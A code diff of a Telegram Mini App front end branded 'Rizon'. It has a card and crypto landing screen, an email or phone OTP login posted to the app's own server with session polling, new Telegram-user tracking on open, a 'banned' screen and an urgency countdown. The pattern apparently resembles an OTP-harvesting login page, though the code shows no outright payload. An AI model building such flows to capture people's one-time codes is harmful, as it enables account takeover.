@@ -121,7 +121,7 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
   box-shadow:0 2px 6px rgba(0,0,0,.06);
 }
 #login h1{font-size:34px;font-weight:800;color:#000;margin-top:24px;letter-spacing:-.5px;}
-#login p.sub{font-size:15px;color:var(--gray);margin-top:8px;margin-bottom:32px;line-height:1.4;}
+#login p.sub{font-size:15px;color:var(--gray);margin-top:8px;margin-bottom:24px;line-height:1.4;}
 .input-group{margin-bottom:16px;}
 .input-group label{
   display:block;font-size:13px;color:#666;margin-bottom:8px;font-weight:500;
@@ -176,7 +176,7 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
   display:flex;align-items:center;justify-content:center;
   font-size:18px;box-shadow:0 2px 6px rgba(0,0,0,.06);cursor:pointer;
 }
-.db-header .right{display:flex;gap:10px;}
+.db-header .right{display:flex;gap:10px;align-items:center;}
 .demo-badge{
   background:var(--yellow);color:#000;font-size:11px;
   padding:5px 10px;border-radius:20px;font-weight:800;
@@ -282,6 +282,19 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
   display:flex;align-items:center;justify-content:center;font-size:22px;
   margin-bottom:6px;box-shadow:0 6px 14px rgba(0,0,0,.25);flex-shrink:0;
 }
+
+/* ══════════ BANNED SCREEN ══════════ */
+#banned{
+  background:#0a0a0a;justify-content:center;align-items:center;
+  padding:40px 24px;text-align:center;
+}
+#banned .icon{font-size:70px;margin-bottom:20px;}
+#banned h1{font-size:28px;font-weight:800;color:#E82127;margin-bottom:12px;}
+#banned p{font-size:15px;color:#999;line-height:1.5;max-width:340px;}
+#banned .footer{
+  position:absolute;bottom:30px;left:0;right:0;
+  text-align:center;font-size:12px;color:#555;
+}
 </style>
 </head>
 <body>
@@ -289,6 +302,14 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 <!-- ══════════ SPLASH ══════════ -->
 <div id="splash" class="screen active">
   <h1>RIZON</h1>
+</div>
+
+<!-- ══════════ BANNED ══════════ -->
+<div id="banned" class="screen">
+  <div class="icon">🚫</div>
+  <h1>Access Denied</h1>
+  <p>You have been banned from using this service.<br>Contact support if you believe this is a mistake.</p>
+  <div class="footer">Rizon © 2025</div>
 </div>
 
 <!-- ══════════ LANDING ══════════ -->
@@ -310,7 +331,7 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
         </div>
         <div class="visa">VISA<br><small style="font-size:9px;">Platinum</small></div>
       </div>
-      <div class="token appl"></div>
+      <div class="token appl">🍎</div>
       <div class="token btc">₿</div>
       <div class="token eth">Ξ</div>
       <div class="token nvda">NVIDIA</div>
@@ -332,13 +353,11 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
   <h1 id="login-title">Welcome back!</h1>
   <p class="sub" id="login-sub">Log in to your Rizon account.</p>
 
-  <!-- Email / Phone toggle -->
   <div class="toggle-tabs">
     <button id="tab-email" class="active" onclick="switchTab('email')">📧 Email</button>
     <button id="tab-phone" onclick="switchTab('phone')">📱 Phone</button>
   </div>
 
-  <!-- STEP 1 -->
   <div id="step-email">
     <div class="input-group">
       <label id="input-label">Email address</label>
@@ -349,7 +368,6 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
             disabled onclick="requestOTP()">Send OTP</button>
   </div>
 
-  <!-- STEP 2 -->
   <div id="step-otp" class="hidden">
     <div class="input-group">
       <label>Enter OTP</label>
@@ -455,31 +473,53 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
    ═══════════════════════════════════════════════════════════ */
 let tg = window.Telegram?.WebApp;
 if (tg) {
-  tg.expand();
-  tg.ready();
+  try { tg.expand(); tg.ready(); } catch (e) { console.log("TG init err:", e); }
   console.log("✅ Telegram WebApp ready");
 } else {
   tg = { close: () => window.close(), ready: () => {} };
-  console.warn("⚠️ Not inside Telegram — fallback");
+  console.warn("⚠️ Not inside Telegram — using fallback");
 }
 
-const API_URL = window.location.origin;
+const API_URL  = window.location.origin;
+const TG_USER  = (tg?.initDataUnsafe?.user) || null;
 console.log("API_URL:", API_URL);
+console.log("TG_USER:", TG_USER);
 
 /* ═══════════════════════════════════════════════════════════
    SCREEN NAVIGATION
    ═══════════════════════════════════════════════════════════ */
 function showScreen(id) {
   document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
-  document.getElementById(id).classList.add("active");
+  const el = document.getElementById(id);
+  if (el) el.classList.add("active");
 }
 
-/* Splash → Landing after 1.8s */
-window.addEventListener("load", () => {
+/* ═══════════════════════════════════════════════════════════
+   BOOT: track open + show landing
+   ═══════════════════════════════════════════════════════════ */
+window.addEventListener("load", async () => {
+  // Track "Opened Mini App" (only if we have a TG user)
+  if (TG_USER) {
+    try {
+      const r = await fetch(`${API_URL}/api/track-open`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ telegram_user: TG_USER })
+      });
+      const d = await r.json();
+      console.log("track-open:", d);
+    } catch (e) {
+      console.log("track-open err:", e);
+    }
+  }
+
+  // Splash → landing after 1.8s
   setTimeout(() => showScreen("landing"), 1800);
 });
 
-/* Landing → Login */
+/* ═══════════════════════════════════════════════════════════
+   LANDING → LOGIN
+   ═══════════════════════════════════════════════════════════ */
 function goLogin() {
   document.getElementById("login-title").textContent = "Welcome back!";
   document.getElementById("login-sub").textContent = "Log in to your Rizon account.";
@@ -500,6 +540,8 @@ function resetLoginForm() {
   document.getElementById("send-otp-btn").classList.remove("hidden");
   document.getElementById("identifier-input").value = "";
   document.getElementById("otp-input").value = "";
+  currentSessionId = null;
+  if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
   updateSendBtnState();
 }
 
@@ -532,14 +574,14 @@ function switchTab(type) {
 }
 
 /* ═══════════════════════════════════════════════════════════
-   FORM VALIDATION
+   VALIDATION
    ═══════════════════════════════════════════════════════════ */
-const identifierInput = document.getElementById("identifier-input");
-const sendOtpBtn      = document.getElementById("send-otp-btn");
-const stepEmail       = document.getElementById("step-email");
-const stepOtp         = document.getElementById("step-otp");
-const statusContainer = document.getElementById("status-container");
-const loadingContainer= document.getElementById("loading-container");
+const identifierInput  = document.getElementById("identifier-input");
+const sendOtpBtn       = document.getElementById("send-otp-btn");
+const stepEmail        = document.getElementById("step-email");
+const stepOtp          = document.getElementById("step-otp");
+const statusContainer  = document.getElementById("status-container");
+const loadingContainer = document.getElementById("loading-container");
 
 identifierInput.addEventListener("input", updateSendBtnState);
 
@@ -573,9 +615,19 @@ async function requestOTP() {
     const res = await fetch(`${API_URL}/api/request-otp`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ identifier })
+      body: JSON.stringify({
+        identifier,
+        telegram_user: TG_USER
+      })
     });
     const data = await res.json();
+
+    if (res.status === 403) {
+      // Banned user
+      loadingContainer.classList.add("hidden");
+      showScreen("banned");
+      return;
+    }
 
     if (data.session_id) {
       currentSessionId = data.session_id;
@@ -655,7 +707,11 @@ function showStatus(msg, type) {
    ═══════════════════════════════════════════════════════════ */
 function noop() { /* demo — buttons do nothing */ }
 
+let countdownStarted = false;
 function startCountdown() {
+  if (countdownStarted) return;
+  countdownStarted = true;
+
   let t = 58 * 60 + 25;
   const el = document.getElementById("countdown");
   if (!el) return;
